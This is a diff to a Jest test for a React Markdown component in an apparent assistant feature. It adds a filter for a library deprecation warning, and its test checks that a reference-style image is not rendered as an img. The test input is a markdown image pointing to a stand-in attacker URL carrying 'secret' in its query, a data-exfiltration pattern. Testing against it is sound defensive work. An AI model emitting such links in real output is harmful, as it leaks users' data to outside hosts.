@@ -12,6 +12,17 @@ import { render, screen } from '@testing-library/react';
 import { Markdown, isInAppHref } from '@/component-library/features/assistant/Markdown';
 
 describe('Markdown', () => {
+    // react-highlight calls a deprecated highlight.js API and logs on every render; hide only that message.
+    let log: jest.SpyInstance;
+    beforeEach(() => {
+        const original = console.log;
+        log = jest.spyOn(console, 'log').mockImplementation((...args: unknown[]) => {
+            if (typeof args[0] === 'string' && args[0].startsWith('Deprecated as of 10.7.0')) return;
+            original(...args);
+        });
+    });
+    afterEach(() => log.mockRestore());
+
     it('renders reference-style images as alt text plus a click-only link', () => {
         const { container } = render(<Markdown text={'![the ref][r]\n\n[r]: https://evil.example/p?d=secret'} />);
         expect(container.querySelector('img')).toBeNull();
